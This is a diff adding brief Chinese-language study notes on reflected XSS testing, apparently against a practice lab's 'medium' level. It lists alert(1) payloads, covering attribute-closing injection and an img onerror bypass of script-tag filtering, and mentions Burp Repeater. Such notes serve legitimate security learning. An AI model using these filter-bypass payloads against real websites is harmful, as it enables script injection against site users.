@@ -1,0 +1,13 @@
+反射XSS手工与burp
+
+<script>alert(1)</script>          被过滤
+
+"><script>alert(1)</script>          成功弹窗    “1”
+
+":闭合属性  value=""    >:结束标签    后面的正常被浏览器执行
+
+"><img src=x onerror=alert(1)>     使用HTML标签的事件属性执行脚本，避<script>标签的过滤
+
+
+可以在burpsuite的repeater模块里看哪些被过滤
+比如medium中过滤了<script>
